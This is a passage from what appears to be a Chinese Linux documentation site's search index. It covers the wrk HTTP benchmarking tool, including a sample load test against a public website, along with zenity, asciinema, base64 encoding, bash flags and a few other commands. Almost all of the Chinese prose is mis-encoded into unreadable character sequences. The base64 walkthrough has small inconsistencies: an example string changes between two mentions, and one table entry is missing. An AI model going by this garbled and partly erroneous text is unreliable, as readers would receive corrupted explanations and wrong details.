ååé‡èƒ½è¾¾åˆ°å¤šå°‘, QPSï¼ˆQuery per second æ¯ç§’å¤„ç†å®Œçš„è¯·æ±‚æ•°ï¼‰ èƒ½è¾¾åˆ°å¤šå°‘å‘¢ ä»‹ç» wrk æ˜¯ä¸€æ¬¾é’ˆå¯¹ Http åè®®çš„åŸºå‡†æµ‹è¯•å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿåœ¨å•æœºå¤šæ ¸ CPU çš„æ¡ä»¶ä¸‹ï¼Œ ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„é«˜æ€§èƒ½ I/O æœºåˆ¶ï¼Œ å¦‚ epollï¼Œkqueue ç­‰ï¼Œé€šè¿‡å¤šçº¿ç¨‹å’Œäº‹ä»¶æ¨¡å¼ï¼Œå¯¹ç›®æ ‡æœºå™¨äº§ç”Ÿå¤§é‡çš„è´Ÿè½½ã€‚ æ³¨è§£ wrk æ˜¯å¤ç”¨äº† redis çš„ ae å¼‚æ­¥äº‹ä»¶é©±åŠ¨æ¡†æ¶ï¼Œ å‡†ç¡®æ¥è¯´ ae äº‹ä»¶é©±åŠ¨æ¡†æ¶å¹¶ä¸æ˜¯ redis å‘æ˜çš„, å®ƒæ¥è‡³äº Tcl çš„è§£é‡Šå™¨ jim, è¿™ä¸ªå°å·§é«˜æ•ˆçš„æ¡†æ¶, å› ä¸ºè¢« redis é‡‡ç”¨è€Œè¢«å¤§å®¶æ‰€ç†ŸçŸ¥ã€‚ ä¼˜åŠ¿ è½»é‡çº§æ€§èƒ½æµ‹è¯•å·¥å…·; å®‰è£…ç®€å•ï¼ˆç›¸å¯¹ Apache ab æ¥è¯´ï¼‰; å­¦ä¹ æ›²çº¿åŸºæœ¬ä¸ºé›¶ï¼Œå‡ åˆ†é’Ÿå°±èƒ½å­¦ä¼šå’‹ç”¨äº†ï¼› åŸºäºç³»ç»Ÿè‡ªå¸¦çš„é«˜æ€§èƒ½ I/O æœºåˆ¶ï¼Œ å¦‚ epoll, kqueue, åˆ©ç”¨å¼‚æ­¥çš„äº‹ä»¶é©±åŠ¨æ¡†æ¶ï¼Œ é€šè¿‡å¾ˆå°‘çš„çº¿ç¨‹å°±å¯ä»¥å‹å‡ºå¾ˆå¤§çš„å¹¶å‘é‡ï¼› åŠ£åŠ¿ wrk ç›®å‰ä»…æ”¯æŒå•æœºå‹æµ‹ï¼Œåç»­ä¹Ÿä¸å¤ªå¯èƒ½æ”¯æŒå¤šæœºå™¨å¯¹ç›®æ ‡æœºå‹æµ‹ï¼Œ å› ä¸ºå®ƒæœ¬èº«çš„å®šä½ï¼Œå¹¶ä¸æ˜¯ç”¨æ¥å–ä»£ JMeter, LoadRunner ç­‰ä¸“ä¸šçš„æµ‹è¯•å·¥å…·ï¼Œ wrk æä¾›çš„åŠŸèƒ½ï¼Œå¯¹æˆ‘ä»¬åç«¯å¼€å‘äººå‘˜æ¥è¯´ï¼Œåº”ä»˜æ—¥å¸¸æ¥å£æ€§èƒ½éªŒè¯è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ã€‚ å®‰è£… wrk åªèƒ½è¢«å®‰è£…åœ¨ç±» Unix ç³»ç»Ÿä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ª Linux æˆ–è€… MacOS ç¯å¢ƒã€‚ Windows 10 å®‰è£…éœ€è¦å¼€å¯è‡ªå¸¦çš„ Ubuntu å­ç³»ç»Ÿã€‚ å¯¹äºDebian: sudo apt-get install build-essential libssl-dev git -y git clone https://github.com/wg/wrk.git wrk cd wrk make # å°†å¯æ‰§è¡Œæ–‡ä»¶ç§»åŠ¨åˆ° /usr/local/bin ä½ç½® sudo cp wrk /usr/local/bin å¯¹äºRedHat: sudo yum groupinstall 'Development Tools' sudo yum install -y openssl-devel git git clone https://github.com/wg/wrk.git wrk cd wrk make # å°†å¯æ‰§è¡Œæ–‡ä»¶ç§»åŠ¨åˆ° /usr/local/bin ä½ç½® sudo cp wrk /usr/local/bin å¯¹äºMacOS: brew install wrk å¯¹äºWindows: Windown 10 éœ€è¦åœ¨ Windows åŠŸèƒ½ é‡Œå‹¾é€‰ é€‚ç”¨äº Linux çš„ Windows å­ç³»ç»Ÿ, ç„¶åé€šè¿‡ bash å‘½ä»¤åˆ‡æ¢åˆ° Ubuntu å­ç³»ç»Ÿã€‚ å‚è€ƒä¸Šé¢. ä½¿ç”¨-è¯­æ³• è¯­æ³•: wrk <é€‰é¡¹> <è¢«æµ‹HTTPæœåŠ¡çš„URL> Options: -c , --connections <N> è·ŸæœåŠ¡å™¨å»ºç«‹å¹¶ä¿æŒçš„TCPè¿æ¥æ•°é‡ -d , --duration <T> å‹æµ‹æ—¶é—´ -t , --threads <N> ä½¿ç”¨å¤šå°‘ä¸ªçº¿ç¨‹è¿›è¡Œå‹æµ‹ -s , --script <S> æŒ‡å®šLuaè„šæœ¬è·¯å¾„ -H , --header <H> ä¸ºæ¯ä¸€ä¸ªHTTPè¯·æ±‚æ·»åŠ HTTPå¤´ --latency åœ¨å‹æµ‹ç»“æŸåï¼Œæ‰“å°å»¶è¿Ÿç»Ÿè®¡ä¿¡æ¯ --timeout <T> è¶…æ—¶æ—¶é—´ -v , --version æ‰“å°æ­£åœ¨ä½¿ç”¨çš„wrkçš„è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯ <N>ä»£è¡¨æ•°å­—å‚æ•°ï¼Œæ”¯æŒå›½é™…å•ä½ (1k, 1M, 1G) <T>ä»£è¡¨æ—¶é—´å‚æ•°ï¼Œæ”¯æŒæ—¶é—´å•ä½ (2s, 2m, 2h) æ³¨è§£ å…³äºçº¿ç¨‹æ•°ï¼Œå¹¶ä¸æ˜¯è®¾ç½®çš„è¶Šå¤§ï¼Œå‹æµ‹æ•ˆæœè¶Šå¥½ï¼Œçº¿ç¨‹è®¾ç½®è¿‡å¤§ï¼Œ åè€Œä¼šå¯¼è‡´çº¿ç¨‹åˆ‡æ¢è¿‡äºé¢‘ç¹ï¼Œæ•ˆæœé™ä½ï¼Œ ä¸€èˆ¬æ¥è¯´ï¼Œæ¨èè®¾ç½®æˆå‹æµ‹æœºå™¨ CPU æ ¸å¿ƒæ•°çš„ 2 å€åˆ° 4 å€å°±è¡Œäº†ã€‚ å¯¹ www.baidu.com å‘èµ·å‹åŠ›æµ‹è¯•ï¼Œ çº¿ç¨‹æ•°ä¸º 12ï¼Œæ¨¡æ‹Ÿ 400 ä¸ªå¹¶å‘è¯·æ±‚ï¼ŒæŒç»­ 30 ç§’: wrk -t12 -c400 -d30s http://www.baidu.com æµ‹è¯•æŠ¥å‘Š è¿˜æ˜¯ä¸Šé¢çš„å¯¹ www.baidu.com å‘èµ·å‹åŠ›æµ‹è¯•ï¼Œ çº¿ç¨‹æ•°ä¸º 12ï¼Œæ¨¡æ‹Ÿ 400 ä¸ªå¹¶å‘è¯·æ±‚ï¼ŒæŒç»­ 30 ç§’ å¹¶æ‰“å°å»¶è¿ŸæŠ¥å‘Š: $ wrk -t12 -c400 -d30s --latency http://www.baidu.com Running 30s test @ http://www.baidu.com 12 threads and 400 connections (å…±12ä¸ªæµ‹è¯•çº¿ç¨‹ï¼Œ400ä¸ªè¿æ¥) (å¹³å‡å€¼) (æ ‡å‡†å·®)ï¼ˆæœ€å¤§å€¼ï¼‰(æ­£è´Ÿä¸€ä¸ªæ ‡å‡†å·®æ‰€å æ¯”ä¾‹) Thread Stats Avg Stdev Max +/- Stdev (å»¶è¿Ÿ) Latency 1.44s 483.77ms 2.00s 76.01% (æ¯ç§’è¯·æ±‚æ•°) Req/Sec 14.70 11.35 90.00 74.57% Latency Distribution (å»¶è¿Ÿåˆ†å¸ƒ) 50% 1.58s 75% 1.79s 90% 1.92s 99% 1.99s 3967 requests in 30.11s, 1.55GB read (30.11så†…å¤„ç†äº† 3967 ä¸ªè¯·æ±‚ï¼Œè€—è´¹æµé‡1.55GB) Socket errors: connect 158, read 0, write 0, timeout 1191 (å‘ç”Ÿé”™è¯¯æ•°) Requests/sec: 131.77 (QPS 131.77,å³å¹³å‡æ¯ç§’å¤„ç†è¯·æ±‚æ•°ä¸º131.77) Transfer/sec: 52.60MB (å¹³å‡æ¯ç§’æµé‡52.60MB) æ³¨è§£ æ ‡å‡†å·®å•¥æ„æ€ï¼Ÿæ ‡å‡†å·®å¦‚æœå¤ªå¤§è¯´æ˜æ ·æœ¬æœ¬èº«ç¦»æ•£ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œæœ‰å¯èƒ½ç³»ç»Ÿæ€§èƒ½æ³¢åŠ¨è¾ƒå¤§ã€‚ å¤æ‚æµ‹è¯• é€šè¿‡ç¼–å†™ Lua è„šæœ¬çš„æ–¹å¼ï¼Œåœ¨è¿è¡Œå‹æµ‹å‘½ä»¤æ—¶ï¼Œé€šè¿‡å‚æ•° --script æ¥æŒ‡å®š Lua è„šæœ¬ æä¾›çš„å‡½æ•° function setup(thread) setup å‡½æ•°åœ¨ç›®æ ‡ IP åœ°å€å·²ç»è§£æå®Œ, å¹¶ä¸”æ‰€æœ‰ thread å·²ç»ç”Ÿæˆ, ä½†æ˜¯è¿˜æ²¡æœ‰å¼€å§‹æ—¶è¢«è°ƒç”¨. æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œä¸€æ¬¡è¿™ä¸ªå‡½æ•°. setup æ–¹æ³•ä¸­å¯æ“ä½œè¯¥ thread å¯¹è±¡ï¼Œè·å–ä¿¡æ¯ã€å­˜å‚¨ä¿¡æ¯ã€ç”šè‡³å…³é—­è¯¥çº¿ç¨‹: thread.addr - get or set the thread's server address thread:get(name) - get the value of a global in the thread's env thread:set(name, value) - set the value of a global in the thread's env thread:stop() - stop the thread function init(args) init å‡½æ•°æ¯æ¬¡è¯·æ±‚å‘é€ä¹‹å‰è¢«è°ƒç”¨. å¯ä»¥æ¥å— wrk å‘½ä»¤è¡Œçš„é¢å¤–å‚æ•°. é€šè¿‡ -- æŒ‡å®š. function delay() delayå‡½æ•°è¿”å›ä¸€ä¸ªæ•°å€¼, åœ¨è¿™æ¬¡è¯·æ±‚æ‰§è¡Œå®Œä»¥åå»¶è¿Ÿå¤šé•¿æ—¶é—´æ‰§è¡Œä¸‹ä¸€ä¸ªè¯·æ±‚. å¯ä»¥å¯¹åº” thinking time çš„åœºæ™¯. function request() requestå‡½æ•°å¯ä»¥æ¯æ¬¡è¯·æ±‚ä¹‹å‰ä¿®æ”¹æœ¬æ¬¡è¯·æ±‚çš„å±æ€§. è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸². è¿™ä¸ªå‡½æ•°è¦æ…ç”¨, ä¼šå½±å“æµ‹è¯•ç«¯æ€§èƒ½. function response(status, headers, body) responseå‡½æ•°æ¯æ¬¡è¯·æ±‚è¿”å›ä»¥åè¢«è°ƒç”¨. å¯ä»¥æ ¹æ®å“åº”å†…å®¹åšç‰¹æ®Šå¤„ç†, æ¯”å¦‚é‡åˆ°ç‰¹æ®Šå“åº”åœæ­¢æ‰§è¡Œæµ‹è¯•, æˆ–è¾“å‡ºåˆ°æ§åˆ¶å°ç­‰ç­‰. function done(summary, latency, requests) doneå‡½æ•°åœ¨æ‰€æœ‰è¯·æ±‚æ‰§è¡Œå®Œä»¥åè°ƒç”¨, ä¸€èˆ¬ç”¨äºè‡ªå®šä¹‰ç»Ÿè®¡ç»“æœ. wrkå®˜ç½‘æä¾›çš„setup.luaå®ä¾‹: -- example script that demonstrates use of setup() to pass -- data to and from the threads local counter = 1 local threads = {} function setup(thread) thread:set(\"id\", counter) table.insert(threads, thread) counter = counter + 1 end function init(args) requests = 0 responses = 0 local msg = \"thread %d created\" print(msg:format(id)) end function request() requests = requests + 1 return wrk.request() end function response(status, headers, body) responses = responses + 1 end function done(summary, latency, requests) for index, thread in ipairs(threads) do local id = thread:get(\"id\") local requests = thread:get(\"requests\") local responses = thread:get(\"responses\") local msg = \"thread %d made %d requests and got %d responses\" print(msg:format(id, requests, responses)) end end å‚è€ƒ:: æ€§èƒ½æµ‹è¯•å·¥å…· wrk ä½¿ç”¨æ•™ç¨‹ HTTPå‹æµ‹å·¥å…·ä¹‹wrk","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-WRK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-WRK.html"},{"title":"zenity","text":"Zenityæ˜¯ä¸€ä¸ªä½¿ç”¨GTK+åº“å¼€å‘çš„å·¥å…·ï¼Œç”¨äºåˆ›å»ºå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å¯¹è¯æ¡†(ä¿¡æ¯æ¡†) ä¸€èˆ¬ GNOME æ¡Œé¢ç³»ç»Ÿä¼šé¢„è£…. GNOME æ˜¯ä¸€ä¸ªåŸºäº GTK+ çš„æ¡Œé¢ç¯å¢ƒ. ç”±äº zenity ä¸ GNOME å¯†åˆ‡ç›¸å…³ï¼Œå› æ­¤å¤§å¤šæ•°åŸºäºGNOMEçš„Linuxå‘è¡Œç‰ˆï¼Œ åŒ…æ‹¬Ubuntuã€Fedoraå’ŒDebianç­‰ï¼Œéƒ½ä¼šé»˜è®¤å®‰è£…Zenityã€‚ å®‰è£…: apt install zenity å¸¸ç”¨é€‰é¡¹: --info ä¿¡æ¯æ¡† --width <num> å¼¹å‡ºæ¡†å®½åº¦ --title <str> æ ‡é¢˜ --text ä¸»åŒºåŸŸæ–‡æœ¬ --window-icon <icon_file> è®¾ç½®çª—ä½“å›¾æ ‡ å¦‚å¼¹å‡ºå®½500çš„ä¿¡æ¯æ¡†: zenity --info --title \"æ ‡é¢˜\" --text \"æ–‡æœ¬\" --width=500","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Zenity.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Zenity.html"},{"title":"asciinema","text":"ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/script ç±»ä¼¼ ç»ˆç«¯è„šæœ¬å½•åˆ¶å·¥å…·, æ”¯æŒå¤šç§æ–¹å¼å®‰è£…, pipå®‰è£…: pip install asciinema debian/ubuntuä½¿ç”¨aptå®‰è£…: apt install asciinema ç»ˆç«¯æ‰§è¡Œçš„å½•åˆ¶ å¼€å§‹å½•åˆ¶: asciinema rec ç„¶ååƒå¹³å¸¸ä¸€æ ·ä½¿ç”¨å³å¯, ä¼šè‡ªåŠ¨è¢«è®°å½• ç»“æŸå½•åˆ¶(ä¹Ÿå¯ä»¥ä¸ç”¨ exit è€Œæ˜¯ç›´æ¥ Ctrl+D ): exit æ ¹æ®æç¤ºå¯é€‰æ‹©ä¸Šä¼ æˆ–è€…ä¿å­˜åˆ°æœ¬åœ°, ä¸€èˆ¬è¾“å‡ºä¸º .cast æ–‡ä»¶ (è²Œä¼¼)","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-asciinema.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-asciinema.html"},{"title":"base64","text":"ä¸€äº›å‘½ä»¤ ä» file ä¸­è¯»å–å­—ç¬¦ä¸²ç„¶åç¼–ç : base64 file å°†å­—ç¬¦ä¸² string+æ¢è¡Œ ç¼–ç ä¸ºbase64çš„å­—ç¬¦ä¸²: echo \"string\" | base64 å°†å­—ç¬¦ä¸² string ç¼–ç ä¸ºbase64çš„å­—ç¬¦ä¸²: echo -n \"string\" | base64 ä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–å·²ç»è¿‡base64ç¼–ç çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œè§£ç : base64 -d file å¯¹base64ç¼–ç çš„å­—ç¬¦ä¸² strå’Œç©ºè¡Œ è¿›è¡Œè§£ç : echo \"str\" | base64 -d å¯¹base64ç¼–ç çš„å­—ç¬¦ä¸²strè¿›è¡Œè§£ç : echo -n \"str\" | base64 -d ç¼–/è§£ç è¿‡ç¨‹è§£æ ä¾‹å­: è½¬æ¢å‰: 10101101,10111010,01110110 è½¬æ¢å: 00101011, 00011011 ,00101001 ,00110110 åè¿›åˆ¶: 43 27 41 54 å¯¹åº”ç è¡¨ä¸­çš„å€¼: r b p 2 æ‰€ä»¥ä¸Šé¢çš„24ä½ç¼–ç ï¼Œç¼–ç åçš„Base64å€¼ä¸º: rbp2 è§£ç åŒç†ï¼ŒæŠŠ rbq2 çš„äºŒè¿›åˆ¶ä½è¿æ¥ä¸Šå†é‡ç»„å¾—åˆ°ä¸‰ä¸ª8ä½å€¼ï¼Œå¾—å‡ºåŸç ã€‚ ï¼ˆè§£ç åªæ˜¯ç¼–ç çš„é€†è¿‡ç¨‹ï¼Œæœ‰å…³MIMEçš„RFCè¿˜æœ‰å¾ˆå¤šï¼Œå¦‚æœéœ€è¦è¯¦ç»†æƒ…å†µè¯·è‡ªè¡ŒæŸ¥æ‰¾ã€‚ï¼‰ è¿‡ç¨‹ï¼š ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¤„ç†ã€‚ è§„åˆ™ï¼šæºç¬¬ä¸€å­—èŠ‚å³ç§»ä¸¤ä½ï¼Œå»æ‰ä½2ä½ï¼Œé«˜2ä½è¡¥é›¶ã€‚ æ—¢ï¼š00 + é«˜6ä½ ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å’Œç¬¬äºŒä¸ªå­—èŠ‚è”åˆå¤„ç†ã€‚ è§„åˆ™å¦‚ä¸‹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚é«˜6ä½å»æ‰ç„¶åå·¦ç§»å››ä½ï¼Œç¬¬äºŒä¸ªå­—èŠ‚å³ç§»å››ä½ å³ï¼šæºç¬¬ä¸€å­—èŠ‚ä½2ä½ + æºç¬¬2å­—èŠ‚é«˜4ä½ ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬äºŒä¸ªå­—èŠ‚å’Œç¬¬ä¸‰ä¸ªå­—èŠ‚è”åˆå¤„ç†ï¼Œ è§„åˆ™ç¬¬äºŒä¸ªå­—èŠ‚å»æ‰é«˜4ä½å¹¶å·¦ç§»ä¸¤ä½ï¼ˆå¾—é«˜6ä½ï¼‰ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚å³ç§»6ä½å¹¶å»æ‰é«˜6ä½ï¼ˆå¾—ä½2ä½ï¼‰ï¼Œç›¸åŠ å³å¯ ç¬¬å››ä¸ªå­—èŠ‚ï¼Œè§„åˆ™ï¼Œæºç¬¬ä¸‰å­—èŠ‚å»æ‰é«˜2ä½å³å¯ ç”¨æ›´æ¥è¿‘äºç¼–ç¨‹çš„æ€ç»´æ¥è¯´ï¼Œç¼–ç çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š ç¬¬ä¸€ä¸ªå­—ç¬¦é€šè¿‡å³ç§»2ä½è·å¾—ç¬¬ä¸€ä¸ªç›®æ ‡å­—ç¬¦çš„Base64è¡¨ä½ç½®ï¼Œæ ¹æ®è¿™ä¸ªæ•°å€¼å–åˆ°è¡¨ä¸Šç›¸åº”çš„å­—ç¬¦ï¼Œå°±æ˜¯ç¬¬ä¸€ä¸ªç›®æ ‡å­—ç¬¦ã€‚ ç„¶åå°†ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸0x03(00000011)è¿›è¡Œä¸(&)æ“ä½œå¹¶å·¦ç§»4ä½,æ¥ç€ç¬¬äºŒä¸ªå­—ç¬¦å³ç§»4ä½ä¸å‰è€…ç›¸æˆ–(|)ï¼Œå³è·å¾—ç¬¬äºŒä¸ªç›®æ ‡å­—ç¬¦ã€‚ å†å°†ç¬¬äºŒä¸ªå­—ç¬¦ä¸0x0f(00001111)è¿›è¡Œä¸(&)æ“ä½œå¹¶å·¦ç§»2ä½,æ¥ç€ç¬¬ä¸‰ä¸ªå­—ç¬¦å³ç§»6ä½ä¸å‰è€…ç›¸æˆ–(|)ï¼Œè·å¾—ç¬¬ä¸‰ä¸ªç›®æ ‡å­—ç¬¦ã€‚ æœ€åå°†ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸0x3f(00111111)è¿›è¡Œä¸(&)æ“ä½œå³è·å¾—ç¬¬å››ä¸ªç›®æ ‡å­—ç¬¦ã€‚ åœ¨ä»¥ä¸Šçš„æ¯ä¸€ä¸ªæ­¥éª¤ä¹‹åï¼Œå†æŠŠç»“æœä¸ 0x3F è¿›è¡Œ AND ä½æ“ä½œ ï¼Œ å°±å¯ä»¥å¾—åˆ°ç¼–ç åçš„å­—ç¬¦äº†ã€‚ åŸæ–‡çš„å­—èŠ‚æ•°é‡åº”è¯¥æ˜¯3çš„å€æ•°ï¼Œå¦‚æœè¿™ä¸ªæ¡ä»¶ä¸èƒ½æ»¡è¶³çš„è¯ï¼Œå…·ä½“çš„è§£å†³åŠæ³•æ˜¯è¿™æ ·çš„ï¼šåŸæ–‡å‰©ä½™çš„å­—èŠ‚æ ¹æ®ç¼–ç è§„åˆ™ç»§ç»­å•ç‹¬è½¬(1å˜2ï¼Œ2å˜3ï¼›ä¸å¤Ÿçš„ä½æ•°ç”¨0è¡¥å…¨)ï¼Œå†ç”¨=å·è¡¥æ»¡4ä¸ªå­—èŠ‚ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äº›Base64ç¼–ç ä¼šä»¥ä¸€ä¸ªæˆ–ä¸¤ä¸ªç­‰å·ç»“æŸçš„åŸå› ï¼Œä½†ç­‰å·æœ€å¤šåªæœ‰ä¸¤ä¸ªã€‚å› ä¸ºä¸€ä¸ªåŸå­—èŠ‚è‡³å°‘ä¼šå˜æˆä¸¤ä¸ªç›®æ ‡å­—èŠ‚ï¼Œæ‰€ä»¥ä½™æ•°ä»»ä½•æƒ…å†µä¸‹éƒ½åªå¯èƒ½æ˜¯0ï¼Œ1ï¼Œ2è¿™ä¸‰ä¸ªæ•°ä¸­çš„ä¸€ä¸ªã€‚å¦‚æœä½™æ•°æ˜¯0çš„è¯ï¼Œå°±è¡¨ç¤ºåŸæ–‡å­—èŠ‚æ•°æ­£å¥½æ˜¯3çš„å€æ•°ï¼ˆæœ€ç†æƒ³çš„æƒ…å†µï¼‰ã€‚å¦‚æœæ˜¯1çš„è¯ï¼Œè½¬æˆ2ä¸ªBase64ç¼–ç å­—ç¬¦ï¼Œä¸ºäº†è®©Base64ç¼–ç æ˜¯4çš„å€æ•°ï¼Œå°±è¦è¡¥2ä¸ªç­‰å·ï¼›åŒç†ï¼Œå¦‚æœæ˜¯2çš„è¯ï¼Œå°±è¦è¡¥1ä¸ªç­‰å·ã€‚ åŸç†ï¼šä¸‰ä¸ªå­—èŠ‚çš„å…«ä¸ªå­—ç¬¦ = å››ä¸ªå­—èŠ‚çš„å…­ä¸ªå­—ç¬¦ ï¼ˆ3*8=4*6ï¼‰ æµç¨‹ï¼š 1ã€å°†å­—ç¬¦è½¬ä¸ºascii 2ã€å°†asciiè½¬ä¸ºäºŒè¿›åˆ¶ 3ã€åŸæœ‰çš„ä¸‰å­—èŠ‚åœ¨è¿™é‡Œä»¥æºä¸€ã€äºŒã€ä¸‰ä»£è¡¨ è½¬æ¢åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š00 + æºä¸€çš„é«˜å…­ä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬äºŒä¸ªå­—èŠ‚ï¼š00 + æºä¸€çš„ä½äºŒä½å­—ç¬¦ + æºäºŒçš„é«˜å››ä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼š00 + æºäºŒçš„ä½å››ä½å­—ç¬¦ + æºä¸‰çš„é«˜äºŒä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬å››ä¸ªå­—èŠ‚ï¼š00 + æºä¸‰çš„ä½å…­ä½å­—ç¬¦ 4ã€è½¬æ¢çš„äºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œæ ¹æ®ç¼–ç è¡¨ç¼–ç  æ³¨æ„ï¼šè½¬æ¢åçš„ç¼–ç é»˜è®¤æ¯76ä¸ªå­—ç¬¦æ¢è¡Œï¼Œè‹¥ä¸éœ€æ¢è¡Œï¼Œshellä¸­ base64 -w 0å³å¯ å¸¸ç”¨: base64 #ç¼–ç  base64 -w num #æŒ‡å®šä»¥å¤šå°‘ä¸ªå­—ç¬¦æ¢è¡Œï¼Œä¸º0åˆ™å¹¶ä¸æ¢è¡Œ base64 -d #è§£ç  ç¼–ç è¡¨ ç´¢å¼• å¯¹åº”å­—ç¬¦ ç´¢å¼• å¯¹åº”å­—ç¬¦ ç´¢å¼• å¯¹åº”å­—ç¬¦ ç´¢å¼• å¯¹åº”å­—ç¬¦ 0 A 17 R 34 i 51 z 1 B 18 S 35 j 52 0 2 C 19 T 36 k 53 1 3 D 20 U 37 l 54 2 4 E 21 V 38 m 55 3 5 F 22 W 39 n 56 4 6 G 23 X 40 o 57 5 7 H 24 Y 41 p 58 6 8 I 25 Z 42 q 59 7 9 J 26 a 43 r 60 8 10 K 27 b 44 s 61 9 11 L 28 c 45 t 62 12 M 29 d 46 u 63 / 13 N 30 e 47 v 14 O 31 f 48 w 15 P 32 g 49 x 16 Q 33 h 50 y","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-base64.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-base64.html"},{"title":"bash","text":"-n ä»…è¯­æ³•æ£€æŸ¥ -v æ‰§è¡Œå‰ï¼Œå…ˆå°†å†…å®¹è¾“å‡ºï¼ˆè¯¦ç»†è¾“å‡ºæ‰§è¡Œè¿‡ç¨‹ï¼‰ -x å°†ä½¿ç”¨çš„è„šæœ¬å†…å®¹æ˜¾ç¤ºåˆ°å±å¹• -c <command> ä»¥éäº¤äº’æ–¹å¼æ‰§è¡Œç»™å®šçš„å‘½ä»¤, å³å°†å†…å®¹ä½œä¸ºè„šæœ¬æ‰§è¡Œ, æ”¯æŒæ¢è¡Œçš„æ–‡æœ¬ -e å¦‚æœå‘½ä»¤è¿”å›éé›¶é€€å‡ºçŠ¶æ€ï¼Œåˆ™ç«‹å³é€€å‡ºè„šæœ¬ -a å°†å‘½ä»¤æ·»åŠ åˆ°å†å²è®°å½•ä¸­ï¼Œè€Œä¸æ‰§è¡Œ -f ç¦ç”¨æ–‡ä»¶åæ‰©å±•ï¼ˆé€šé…ç¬¦ï¼‰ -i äº¤äº’å¼è¿è¡ŒShell -r ç¦ç”¨åæ–œæ è½¬ä¹‰ -s ä»æ ‡å‡†è¾“å…¥è¯»å–å‘½ä»¤è€Œä¸ä»ç»ˆç«¯è¯»å–","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bash.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bash.html"},{"title":"bg","text":"è®©å‰å°ä»»åŠ¡åœ¨åå°æ‰§è¡Œ. ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/jobs æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹, ä½¿ç¬¬Nä¸ªä»»åŠ¡åœ¨åå°è¿è¡Œï¼ˆ%å‰æœ‰ç©ºæ ¼ï¼‰: bg %N é»˜è®¤ä¸å¸¦%Næ—¶è¡¨ç¤ºå¯¹æœ€åä¸€ä¸ªè¿›ç¨‹æ“ä½œï¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-but.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-but.html"},{"title":"bzip2","text":"è§£å‹ç¼©, æ‰©å±•åä¸€èˆ¬ç”¨.gz2 è¯­æ³•å‚æ•°åŸºæœ¬ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/gzip ä¸€è‡´ æ³¨è§£ tarå‘½ä»¤ä¸­å¢åŠ ä¸€ä¸ªé€‰é¡¹(-j)å¯ä»¥è°ƒç”¨bzip2","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bzip2.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bzip2.html"},{"title":"cal","text":"æŸ¥çœ‹å½“å‰æ—¥å†, é»˜è®¤åªæ˜¾ç¤ºå½“å‰æœˆä»½ -y æ˜¾ç¤ºå®Œæ•´ä¸€å¹´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cal.html"},{"title":"chkconfig","text":"chkconfigæ˜¯ç®¡ç†ç³»ç»ŸæœåŠ¡(service)çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ æ‰€è°“ç³»ç»ŸæœåŠ¡(service)ï¼Œå°±æ˜¯éšç³»ç»Ÿå¯åŠ¨è€Œå¯åŠ¨ï¼Œéšç³»ç»Ÿå…³é—­è€Œå…³é—­çš„ç¨‹åºã€‚ chkconfigå¯ä»¥æ›´æ–°(å¯åŠ¨æˆ–åœæ­¢)å’ŒæŸ¥è¯¢ç³»ç»ŸæœåŠ¡(service)è¿è¡Œçº§ä¿¡æ¯ã€‚ 